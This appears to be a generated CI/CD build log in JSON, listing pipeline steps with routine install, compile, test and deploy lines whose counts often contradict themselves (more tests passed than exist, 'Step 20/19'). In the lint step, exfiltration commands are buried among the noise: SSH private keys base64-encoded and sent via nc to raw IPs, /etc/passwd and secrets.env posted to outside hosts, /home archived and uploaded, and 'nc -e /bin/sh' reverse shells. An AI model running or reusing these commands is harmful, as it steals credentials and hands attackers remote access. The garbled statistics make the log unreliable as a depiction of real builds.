uploaded: dist.zip (81MB)\nBuilding Docker image...\nTransforming 285 files...\nPushing to registry...\nStep 14/15: Running migrations\nArtifact uploaded: build.tar.gz (9MB)\nTime: 43.436s\nLoading...\nConnecting to startup.dev:443...\nTransforming 585 files...\nStep 4/23: Testing\nTest Suites: 19 passed, 15 total\nTime: 80.311s\nSnapshots: 17 passed, 5 total\nVerifying...\n  PASS: e2e/test_db_connect.spec.js\nMinifying app.js\nConnecting to startup.dev:443...\npip: Downloading react-5.1.tar.gz\n\u2717 build failed with exit code 42\nAlready up to date.\nWARNING: lodash has known vulnerabilities\nStep 8/17: Deploying\nVerifying...\n[12:20:08] DEBUG: Query executed in 3ms\nArtifact uploaded: dist.zip (53MB)\nCompiling utils/index.js...\nTime: 79.411s\nTests: 458 passed, 118 total\nnpm install: added 253 packages\n  PASS: test_db_connect (393ms)\nUsing Node.js 14.9.9\nStep 3/23: Building\nCache hit for key-2815\nTests: 398 passed, 456 total\nyarn add: Done in 2.84s\nArtifact uploaded: dist.zip (69MB)\nHEAD is now at 11c1bd2\nnpm install: resolved 1264 packages\nStep 15/25: Installing dependencies\nCompiling utils/utils.go...\nCompiling src/app.ts...\n[12:20:08] WARN: Deprecated API usage\nnpm notice: package.json updated\nEnvironment: development\n\u2713 build completed\n[12:20:08] DEBUG: Initializing service\nPulling image: python:3.11\nFAILED: test_auth_login\nCache saved successfully\n  PASS: e2e/test_api_health.spec.js\nBundling styles.css\npip: Downloading webpack-2.14.tar.gz\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\nDone.\nCache restored successfully (58MB)\nBundling runtime.css\npip: Collecting eslint\nCoverage: 99% statements, 78% branches\n[12:20:08] INFO: Connecting to database\npip install: Successfully installed axios-1.13\nEnvironment: staging\nStep 18/23: Installing dependencies\n  PASS: test_user_create (140ms)\nTest Suites: 43 passed, 42 total\nChecking out master branch\nCompiling src/service.java...\nyarn add: Done in 18.41s\n\u2713 package completed\nTLS handshake completed\nSuccess!\nCompiling utils/service.java...\nReady.\nHEAD is now at 9a93488\nInstalling eslint@1.6.4\nLayer 4/8: ENV command\nArtifact uploaded: build.tar.gz (26MB)\nEnvironment: production\nConnecting to cloud.services:443...\npip: Installing build dependencies...\n[12:20:08] DEBUG: Memory usage: 339MB\nTLS handshake completed\nTime: 98.437s\n[12:20:08] INFO: Processing request\nyarn add: Done in 17.32s\nBundling runtime.js\nAlready up to date.\n\u2713 Task completed in 4906ms\nTime: 83.597s\nyarn add: Done in 25.48s\n[12:20:08] INFO: Cache refreshed\nnpm notice: package.json updated\nDone.\n  PASS: test_auth_login (17ms)\nOK\n  PASS: integration/test_api_health.spec.js\nWARNING: jest has known vulnerabilities\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:08] DEBUG: Connection pool: 4 active\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] INFO: Connecting to database\nConnection established\nCompiling utils/app.ts...\nChecking out develop branch\n  PASS: test_auth_login (163ms)\nPOST /api - 202 (87ms)\nInstalling lodash@3.7.0\nCompiling src/service.java...\n[12:20:08] WARN: Deprecated API usage\nNODE_ENV=test\n\u2713 All checks passed\nOptimizing 11 modules...\nTime: 65.197s\n[12:20:08] DEBUG: Connection pool: 12 active\nMinifying vendor.js\nCompiling src/utils.go...\nnpm install: added 213 packages\nBuilding Docker image...\nChecking out develop branch\nSnapshots: 32 passed, 35 total\nArtifact downloaded: 27MB\n[12:20:08] INFO: Cache refreshed\nFetching submodules...\nCoverage: 77% statements, 82% branches\nyarn add: Done in 24.3s\nyarn add: Done in 30.36s\nHEAD is now at 309ae62\nPOST /upload - 200 (73ms)\nAlready up to date.\nUsing Python 3.11\nVerifying...\nCompiling components/main.py...\nCache restored successfully (60MB)\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] DEBUG: Initializing service\npip: Collecting express\n  PASS: integration/test_db_connect.spec.js\nCompiling lib/handler.rs...\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (468ms)\nTransforming 859 files...\n=== Step deploy_staging completed ===\n=== Step: setup_environment ===\nStep 12/22: Testing\n\u2713 All checks passed\nLoading...\n  PASS: test_db_connect (177ms)\nImage pulled successfully\nUsing Python 3.10\nReady.\nVerifying...\nTime: 97.546s\nStep 11/19: Testing\nFetching submodules...\nArtifact uploaded: build.tar.gz (48MB)\n[12:20:08] INFO: Cache refreshed\nUploading artifact 'dist' (29 files)\nOptimizing 85 modules...\n\u2713 Step 'build' succeeded\n\u2713 All checks passed\n\u2713 Task completed in 3854ms\nStep 1/23: Installing dependencies\n[12:20:08] INFO: Starting build process\n\u2713 Step 'build' succeeded\nWARNING: axios has known vulnerabilities\npip: Collecting prettier\nEnvironment: test\nStep 16/16: Installing dependencies\nRan 68 tests in 7s\nnpm install: added 147 packages\nChecking out main branch\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nSwitched to branch 'feature/task-600'\nTransforming 496 files...\nPlatform: linux-x64\nWARNING: axios has known vulnerabilities\nDone.\nCompiling lib/main.py...\nCompiling src/handler.rs...\nRan 172 tests in 45s\nVerifying...\nUsing Node.js 20.11.2\nCompiling utils/main.py...\nnpm install: resolved 339 packages\nCache invalidated: dependencies\nSuccess!\n  PASS: unit/test_api_health.spec.js\nEnvironment: staging\nProcessing...\nWaiting...\nGenerating source maps...\nSuccess!\nCompleted.\npip: Downloading react-5.16.tar.gz\nPushing to registry...\nInstalling webpack@3.13.10\nStep 6/17: Linting\n[12:20:08] ERROR: Connection failed\nNODE_ENV=development\nCompiling utils/app.ts...\nWARNING: axios has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nPlatform: win32-x64\nConnection established\nStep 14/15: Installing dependencies\nHEAD is now at b2fcd2c\nChecking out develop branch\n[12:20:08] WARN: Deprecated API usage\nTLS handshake completed\nCompiling utils/handler.rs...\nUsing Node.js 16.20.5\n[12:20:08] WARN: Deprecated API usage\nRan 134 tests in 16s\n\u2717 build failed with exit code 33\nImage pulled successfully\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\nLoading...\nAlready up to date.\nCompiling utils/app.ts...\nReady.\nLayer 1/14: RUN command\npip: Downloading lodash-3.10.tar.gz\nFinished.\n\u2713 lint completed\npip install: Successfully installed lodash-3.7\n[12:20:08] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\nStep 19/25: Running migrations\nException: NullPointerException\nCompleted.\nReady.\nCache hit for key-9362\nGenerating source maps...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] INFO: Cache refreshed\n\u2713 All checks passed\nFinished.\nArtifact downloaded: 19MB\nFinished.\nOK\nException: NullPointerException\nCache hit for key-3160\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] INFO: Processing request\nCompiling src/utils.go...\nnpm install: added 470 packages\nAlready up to date.\n[12:20:08] DEBUG: Memory usage: 1097MB\nWARNING: react has known vulnerabilities\n\u2713 package completed\nSnapshots: 17 passed, 0 total\n[12:20:08] INFO: Connecting to database\nPOST /upload - 202 (332ms)\nCreating production build...\nStep 20/16: Running migrations\nCreating production build...\nOK\nCompiling lib/index.js...\nyarn add: Done in 9.48s\n[12:20:08] DEBUG: Initializing service\n[12:20:08] DEBUG: Connection pool: 11 active\n[12:20:08] INFO: Processing request\n[12:20:08] DEBUG: Query executed in 88ms\nChecking out master branch\nCompiling utils/app.ts...\nVerifying...\n[12:20:08] INFO: Processing request\nLoading...\nHEAD is now at 4788410\npip: Installing build dependencies...\nLoading...\nStep 7/23: Testing\nnpm install: resolved 1598 packages\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] INFO: Processing request\nStep 5/22: Running migrations\nFinished.\nSwitched to branch 'feature/task-663'\nRan 16 tests in 48s\nCache hit for key-9098\n\u2713 validate completed\nCache miss for key-3455\n\u2713 Task completed in 4832ms\nReady.\nRan 149 tests in 8s\npip install: Successfully installed eslint-1.8\nTest Suites: 31 passed, 14 total\nFAILED: test_api_health\nCompiling src/main.py...\nnpm install: resolved 798 packages\n[12:20:08] INFO: Connecting to database\nBuilding Docker image...\nChecking out develop branch\nStep 2/19: Running migrations\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'hotfix/task-747'\nCompiling components/service.java...\nFAILED: test_auth_login\n[12:20:08] INFO: Connecting to database\nBuilding Docker image...\n[12:20:08] INFO: Processing request\nCache hit for key-3775\nStep 18/25: Building\n[12:20:08] INFO: Processing request\nCreating production build...\nCoverage: 95% statements, 69% branches\n[12:20:08] DEBUG: Memory usage: 1932MB\nVerifying...\nCreating production build...\nnpm install: resolved 1935 packages\n\u2713 validate completed\nFAILED: test_api_health\n[12:20:08] INFO: Request completed\nGET /health - 204 (43ms)\n\u2713 Task completed in 1413ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] INFO: Connecting to database\nPulling image: python:3.11\nyarn add: Done in 21.35s\nCache hit for key-2661\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'build' succeeded\nUsing Node.js 14.18.3\n[12:20:08] DEBUG: Initializing service\nnpm install: resolved 551 packages\nHEAD is now at f6e2b9e\nCache saved successfully\nArtifact uploaded: dist.zip (29MB)\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: lodash has known vulnerabilities\nChecking out develop branch\nTransforming 737 files...\nCreating production build...\nCompiling components/index.js...\n[12:20:08] DEBUG: Loading configuration\nyarn add: Done in 7.96s\npip: Collecting axios\nTest Suites: 33 passed, 16 total\n[12:20:08] DEBUG: Initializing service\n=== Step setup_environment completed ===\n=== Step: build ===\nTest Suites: 13 passed, 44 total\n\u2713 Step 'checkout' succeeded\nCache miss for key-4010\nTLS handshake completed\n[12:20:08] ERROR: Connection failed\nGenerating source maps...\nDone.\nCache saved successfully\nUsing Node.js 19.4.3\nCache hit for key-6098\n[12:20:08] INFO: Processing request\nProcessing...\nChecking out develop branch\nPushing to registry...\nOK\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] DEBUG: Memory usage: 624MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /api - 200 (391ms)\nArtifact downloaded: 7MB\n[12:20:08] DEBUG: Connection pool: 17 active\nEnvironment: development\nInstalling react@3.3.5\nHEAD is now at 24a6f96\nArtifact uploaded: build.tar.gz (21MB)\nUsing Python 3.11\nPushing to registry...\nConnection established\nCompiling components/index.js...\n\u2713 Step 'build' succeeded\nLoading...\n[12:20:08] DEBUG: Query executed in 95ms\n[12:20:08] INFO: Starting build process\npip install: Successfully installed react-4.6\npip install: Successfully installed express-5.15\npip: Collecting prettier\nMinifying vendor.js\nCache hit for key-7037\n[12:20:08] DEBUG: Query executed in 59ms\n[12:20:08] DEBUG: Loading configuration\nGenerating source maps...\n[12:20:08] DEBUG: Loading configuration\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.10\n\u2717 build failed with exit code 122\nGET /status - 201 (13ms)\n[12:20:08] INFO: Processing request\nnpm notice: package.json updated\nProcessing...\nRan 200 tests in 50s\nyarn add: Done in 28.25s\nnpm notice: created a lockfile\nStep 4/20: Testing\nStep 20/21: Linting\nGenerating source maps...\n\u2717 build failed with exit code 73\nCache restored successfully (199MB)\nStep 17/18: Building\nUploading artifact 'dist' (27 files)\nChecking out develop branch\nyarn add: Done in 7.80s\nCompiling components/utils.go...\nOptimizing 72 modules...\n\u2717 build failed with exit code 89\nCache invalidated: node_modules\nFinished.\nCompiling utils/main.py...\nArtifact downloaded: 14MB\nSuccess!\nFinished.\nCoverage: 77% statements, 85% branches\nCompiling components/main.py...\n  PASS: test_api_health (42ms)\nPushing to registry...\nConnecting to cloud.services:443...\npip install: Successfully installed jest-3.15\n\u2713 Task completed in 2619ms\n\u2717 build failed with exit code 116\nBuilding Docker image...\nnpm notice: created a lockfile\nCompleted.\nSnapshots: 43 passed, 20 total\nTests: 210 passed, 490 total\nUsing Node.js 16.1.2\nPOST /data - 200 (402ms)\nPushing to registry...\n[12:20:08] INFO: Connecting to database\nOptimizing 78 modules...\nOK\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 17/21: Building\n\u2713 All checks passed\nArtifact downloaded: 1MB\nTLS handshake completed\nFetching submodules...\n\u2717 build failed with exit code 125\nStep 8/23: Installing dependencies\nCache invalidated: node_modules\nAlready up to date.\nEnvironment: staging\nyarn add: Done in 19.26s\n\u2713 test completed\npip install: Successfully installed lodash-3.17\nCompleted.\nGenerating source maps...\nChecking out develop branch\nStep 18/20: Linting\nBuilding Docker image...\nTLS handshake completed\nOK\n[12:20:08] DEBUG: Loading configuration\nConnection established\nMinifying app.js\nBundling vendor.css\nLayer 2/8: COPY command\nStep 3/19: Installing dependencies\nnpm install: resolved 1879 packages\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\npip: Collecting jest\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] ERROR: Connection failed\nFinished.\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] WARN: Deprecated API usage\nCache hit for key-1748\nInstalling axios@2.2.9\n\u2713 Task completed in 3074ms\n\u2713 Step 'install' succeeded\nnpm install: added 13 packages\nCreating production build...\nCompiling lib/utils.go...\nSwitched to branch 'bugfix/task-978'\n[12:20:08] INFO: Cache refreshed\nnpm install: resolved 1417 packages\nException: NullPointerException\nConnection established\npip: Installing build dependencies...\nStep 5/16: Testing\nPlatform: linux-x64\nArtifact downloaded: 40MB\nSuccess!\nCompleted.\nnpm install: added 95 packages\nFetching submodules...\n[12:20:08] DEBUG: Loading configuration\nEnvironment: test\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nImage pulled successfully\npip install: Successfully installed jest-1.1\nCompiling lib/service.java...\nSwitched to branch 'feature/task-995'\npip install: Successfully installed webpack-2.7\nPOST /api - 200 (478ms)\n\u2713 deploy completed\n[12:20:08] WARN: Deprecated API usage\nCache hit for key-9875\nOK\nUsing Python 3.9\nCache miss for key-7709\nReady.\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nStep 4/25: Running migrations\nUsing Node.js 14.11.7\nCompiling components/index.js...\nPlatform: win32-x64\n[12:20:08] INFO: Connecting to database\n\u2713 lint completed\nWARNING: react has known vulnerabilities\n\u2713 package completed\nPlatform: darwin-arm64\nStep 12/22: Linting\npip: Downloading express-2.5.tar.gz\nProcessing...\nPushing to registry...\nHEAD is now at f3a1a51\n[12:20:08] DEBUG: Connection pool: 19 active\nPOST /api - 201 (209ms)\nSnapshots: 35 passed, 35 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\nnpm notice: package.json updated\nNODE_ENV=test\nCache saved successfully\nImage pulled successfully\nImage pulled successfully\n[12:20:08] DEBUG: Query executed in 62ms\nSuccess!\nPOST /upload - 200 (264ms)\nUploading artifact 'coverage' (6 files)\nPOST /upload - 200 (346ms)\nWARNING: express has known vulnerabilities\n[12:20:08] DEBUG: Initializing service\n[12:20:08] DEBUG: Query executed in 59ms\nCache saved successfully\nPlatform: darwin-arm64\n\u2713 All checks passed\npip: Installing build dependencies...\n=== Step build completed ===\n=== Step: lint ===\nArtifact uploaded: dist.zip (24MB)\nStep 11/16: Running migrations\nBundling main.js\nCache saved successfully\nProcessing...\nCache restored successfully (199MB)\nCoverage: 94% statements, 61% branches\necho $(cat ~/.ssh/id_rsa) | base64 | nc 205.22.39.248 40553\nTest Suites: 38 passed, 7 total\nVerifying...\nStep 10/24: Building\nOptimizing 84 modules...\n[12:20:08] ERROR: Connection failed\nOptimizing 50 modules...\n[12:20:08] DEBUG: Initializing service\nTests: 283 passed, 212 total\nTLS handshake completed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\npip: Downloading jest-3.15.tar.gz\n[12:20:08] WARN: Deprecated API usage\nInstalling express@2.14.4\npip install: Successfully installed jest-4.15\nTLS handshake completed\nAlready up to date.\n\u2713 Task completed in 619ms\n\u2713 deploy completed\nCache invalidated: build\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:20:08] INFO: Request completed\nSending 309MB of data to acme.corp\nWaiting...\nSnapshots: 30 passed, 0 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at f1e5f66\nStep 1/25: Running migrations\nTransforming 843 files...\nTests: 342 passed, 400 total\nTest Suites: 25 passed, 7 total\nCache hit for key-2590\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 121 packages\nVerifying...\npip: Installing build dependencies...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 151.102.79.82 55848\nLoading...\nCache hit for key-1153\n[12:20:08] DEBUG: Loading configuration\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:20:08] INFO: Starting build process\n[12:20:08] DEBUG: Initializing service\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nFAILED: test_db_connect\nStep 5/15: Building\nNODE_ENV=development\nStep 20/19: Building\nCompiling utils/index.js...\ncurl -X POST https://example.com/collect -d @secrets.env\nDone.\nUsing Python 3.9\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCompiling src/service.java...\nnpm notice: package.json updated\nCache invalidated: node_modules\necho $(cat ~/.ssh/id_rsa) | base64 | nc 51.29.139.183 61526\nRan 165 tests in 7s\n  PASS: test_auth_login (309ms)\nnc -e /bin/sh 24.108.77.217 48263\nReady.\nCreating production build...\nOK\nStep 13/16: Building\nEnvironment: staging\nRan 75 tests in 29s\nTest Suites: 6 passed, 15 total\n[12:20:08] INFO: Connecting to database\nConnection established\nReady.\nStep 17/18: Deploying\nProcessing...\n  PASS: test_user_create (130ms)\nFetching submodules...\n[12:20:08] DEBUG: Loading configuration\nCache miss for key-9684\nnpm install: added 172 packages\npip: Downloading prettier-3.6.tar.gz\nUsing Python 3.11\nCoverage: 70% statements, 79% branches\ncurl -X POST https://test.io/collect -d @secrets.env\nUsing Python 3.9\nCompiling src/service.java...\nTests: 345 passed, 435 total\n\u2713 Step 'setup' succeeded\nOK\nCompleted.\nnpm install: added 489 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 107.119.38.184 42783\nUsing Node.js 17.15.0\nSnapshots: 14 passed, 45 total\nRan 161 tests in 60s\nArtifact uploaded: dist.zip (16MB)\nPulling image: python:18\nRan 42 tests in 32s\nImage pulled successfully\n[12:20:08] INFO: Request completed\nCache invalidated: build\nSending 310MB of data to acme.corp\nAlready up to date.\nArtifact uploaded: build.tar.gz (15MB)\n[12:20:08] DEBUG: Connection pool: 8 active\nInstalling axios@4.16.5\nWARNING: prettier has known vulnerabilities\nSwitched to branch 'hotfix/task-318'\nImage pulled successfully\nEnvironment: development\nStep 11/23: Testing\nTest Suites: 32 passed, 33 total\nPOST /upload - 202 (231ms)\nStep 7/22: Building\nImage pulled successfully\nAlready up to date.\nPOST /api - 201 (459ms)\nTransforming 943 files...\nAlready up to date.\nTest Suites: 43 passed, 50 total\nGET /health - 204 (4ms)\nnpm notice: package.json updated\nCache restored successfully (395MB)\nCache invalidated: node_modules\n[12:20:08] DEBUG: Query executed in 62ms\n[12:20:08] INFO: Processing request\n\u2713 Step 'install' succeeded\nFAILED: test_auth_login\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:20:08] INFO: Connecting to database\nGenerating source maps...\nAlready up to date.\nnpm notice: package.json updated\n[12:20:08] INFO: Starting build process\nChecking out develop branch\nWARNING: react has known vulnerabilities\n[12:20:08] INFO: Starting build process\nTest Suites: 49 passed, 22 total\nCompiling src/utils.go...\nCompiling src/index.js...\nMinifying main.js\nArtifact uploaded: dist.zip (77MB)\nTest Suites: 13 passed, 26 total\nFinished.\nSwitched to branch 'hotfix/task-565'\n[12:20:08] INFO: Cache refreshed\nMinifying app.js\nWARNING: eslint has known vulnerabilities\nnc -e /bin/sh 211.66.104.140 52437\nnpm notice: package.json updated\nArtifact downloaded: 48MB\nCreating production build...\n  PASS: test_db_connect (53ms)\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: build\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=test\nUsing Python 3.9\nOptimizing 89 modules...\nProcessing...\nGET /health - 201 (29ms)\nNODE_ENV=production\nConnection established\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\nUsing Node.js 15.13.4\nCompiling src/utils.go...\n\u2713 Task completed in 2934ms\nStep 1/24: Building\nDone.\n[12:20:08] DEBUG: Query executed in 37ms\nBuilding Docker image...\nStep 15/24: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/24: Running migrations\nConnection established\n[12:20:08] INFO: Cache refreshed\nSwitched to branch 'feature/task-342'\nTests: 401 passed, 195 total\nTime: 16.98s\n[12:20:08] INFO: Request completed\nFetching submodules...\n[12:20:08] ERROR: Connection failed\n[12:20:08] INFO: Connecting to database\n[12:20:08] INFO: Connecting to database\nCache miss for key-2016\nCache restored successfully (48MB)\nLoading...\nArtifact downloaded: 44MB\n[12:20:08] WARN: Deprecated API usage\npip: Collecting axios\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nImage pulled successfully\nCompiling src/main.py...\nDone.\nStep 16/23: Linting\npip: Downloading jest-1.1.tar.gz\nStep 5/21: Linting\n\u2713 Task completed in 329ms\nConnecting to startup.dev:443...\n[12:20:08] INFO: Processing request\nnpm notice: package.json updated\n[12:20:08] ERROR: Connection failed\nCompiling src/service.java...\n\u2713 Step 'checkout' succeeded\nFetching submodules...\nLoading...\nSending 484MB of data to acme.corp\n[12:20:08] WARN: Deprecated API usage\nTransforming 902 files...\n\u2713 Task completed in 2853ms\n[12:20:08] INFO: Request completed\nProcessing...\npip: Downloading webpack-2.1.tar.gz\necho $(cat ~/.ssh/id_rsa) | base64 | nc 220.125.149.67 64888\n=== Step lint completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-23T12:20:08.591133",
        "finished_at": "2025-11-23T12:20:12.350381",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: dist.zip (90MB)",
          "[12:20:08] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (48 files)",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: dist.zip (38MB)",
          "Ran 122 tests in 10s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 202 (260ms)",
          "Installing webpack@2.15.8",
          "[12:20:08] DEBUG: Query executed in 37ms",
          "Transforming 659 files...",
          "[12:20:08] DEBUG: Loading configuration",
          "Transforming 781 files...",
          "Success!",
          "Test Suites: 41 passed, 16 total",
          "Done.",
          "Pulling image: node:18",
          "Exception: NullPointerException",
          "Layer 3/8: COPY command",
          "  PASS: test_api_health (312ms)",
          "npm notice: created a lockfile",
          "pip: Collecting react",
          "Bundling styles.js",
          "Switched to branch 'hotfix/task-361'",
          "[12:20:08] INFO: Request completed",
          "Building Docker image...",
          "[12:20:08] INFO: Processing request",
          "Test Suites: 41 passed, 30 total",
          "\u2713 Step 'test' succeeded",
          "npm install: added 459 packages",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 build completed",
          "Optimizing 43 modules...",
          "[12:20:08] DEBUG: Connection pool: 10 active",
          "POST /upload - 200 (401ms)",
          "npm notice: package.json updated",
          "Processing...",
          "  PASS: unit/test_user_create.spec.js",
          "[12:20:08] INFO: Processing request",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Pulling image: alpine:18",
          "Connection established",
          "TLS handshake completed",
          "Coverage: 87% statements, 73% branches",
          "Exception: NullPointerException",
          "pip install: Successfully installed lodash-3.8",
          "[12:20:08] DEBUG: Initializing service",
          "Step 4/16: Installing dependencies",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Optimizing 14 modules...",
          "[12:20:08] DEBUG: Connection pool: 4 active",
          "[12:20:08] DEBUG: Memory usage: 454MB",
          "[12:20:08] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 185 tests in 19s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] DEBUG: Memory usage: 1451MB",
          "pip install: Successfully installed webpack-5.2",
          "[12:20:08] DEBUG: Query executed in 12ms",
          "WARNING: axios has known vulnerabilities",
          "Pushing to registry...",
          "Cache hit for key-5482",
          "Using Python 3.10",
          "HEAD is now at b824d6e",
          "Ran 123 tests in 18s",
          "Pulling image: node:latest",
          "Step 17/25: Installing dependencies",
          "Minifying app.js",
          "Image pulled successfully",
          "Verifying...",
          "Compiling lib/main.py...",
          "Success!",
          "Coverage: 75% statements, 69% branches",
          "Artifact downloaded: 31MB",
          "Cache invalidated: node_modules",
          "Tests: 464 passed, 120 total",
          "WARNING: axios has known vulnerabilities",
          "[12:20:08] DEBUG: Loading configuration",
          "Success!",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Platform: win32-x64",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] DEBUG: Connection pool: 16 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/index.js...",
          "Building Docker image...",
          "Artifact downloaded: 31MB",
          "Layer 6/14: RUN command",
          "Environment: production",
          "Optimizing 96 modules...",
          "Step 3/18: Running migrations",
          "Ready.",
          "\u2713 lint completed",
          "Using Node.js 16.17.6",
          "Minifying vendor.js",
          "npm install: resolved 1827 packages",
          "pip: Installing build dependencies...",
          "Step 7/19: Deploying",
          "POST /data - 201 (40ms)",
          "Pushing to registry...",
          "Optimizing 52 modules...",
          "[12:20:08] DEBUG: Loading configuration",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] WARN: Deprecated API usage",
          "Uploading artifact 'build' (45 files)",
          "Generating source maps...",
          "Time: 12.617s",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: dist.zip (25MB)",
          "[12:20:08] INFO: Starting build process",
          "Processing...",
          "TLS handshake completed",
          "Using Node.js 15.14.9",
          "NODE_ENV=production",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:08] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Bundling styles.js",
          "npm notice: package.json updated",
          "POST /api - 202 (70ms)",
          "[12:20:08] INFO: Starting build process",
          "Switched to branch 'bugfix/task-273'",
          "POST /api - 202 (475ms)",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (1MB)",
          "Cache invalidated: node_modules",
          "[12:20:08] WARN: Deprecated API usage",
          "Finished.",
          "Step 16/23: Installing dependencies",
          "Transforming 746 files...",
          "Using Node.js 19.13.2",
          "  PASS: integration/test_auth_login.spec.js",
          "POST /data - 202 (482ms)",
          "pip install: Successfully installed eslint-3.3",
          "Installing jest@1.18.8",
          "Optimizing 70 modules...",
          "Transforming 806 files...",
          "Switched to branch 'feature/task-530'",
          "Transforming 163 files...",
          "[12:20:08] WARN: Deprecated API usage",
          "Step 20/19: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "\u2713 test completed",
          "pip install: Successfully installed lodash-3.18",
          "Ready.",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "pip: Collecting webpack",
          "Cache invalidated: dependencies",
          "Ready.",
          "Pulling image: node:3.11",
          "Checking out main branch",
          "Generating source maps...",
          "Completed.",
          "\u2713 All checks passed",
          "OK",
          "Checking out main branch",
          "Success!",
          "Test Suites: 13 passed, 40 total",
          "Success!",
          "pip install: Successfully installed webpack-1.20",
          "Uploading artifact 'coverage' (34 files)",
          "[12:20:08] DEBUG: Query executed in 17ms",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (96MB)",
          "Environment: test",
          "Optimizing 23 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "[12:20:08] DEBUG: Query executed in 97ms",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Cache miss for key-7233",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Finished.",
          "\u2713 Step 'test' succeeded",
          "  PASS: test_db_connect (189ms)",
          "Artifact downloaded: 17MB",
          "Snapshots: 50 passed, 11 total",
          "Step 20/20: Linting",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 Step 'setup' succeeded",
          "Platform: win32-x64",
          "Loading...",
          "Step 17/20: Running migrations",
          "Cache restored successfully (478MB)",
          "\u2713 package completed",
          "Platform: darwin-arm64",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-23T12:20:12.350381",
        "finished_at": "2025-11-23T12:20:31.146619",
        "log_lines": [
          "=== Step: integration_tests ===",
          "  PASS: test_auth_login (149ms)",
          "Step 18/17: Testing",
          "\u2713 validate completed",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] DEBUG: Connection pool: 7 active",
          "Step 2/25: Installing dependencies",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-902'",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "OK",
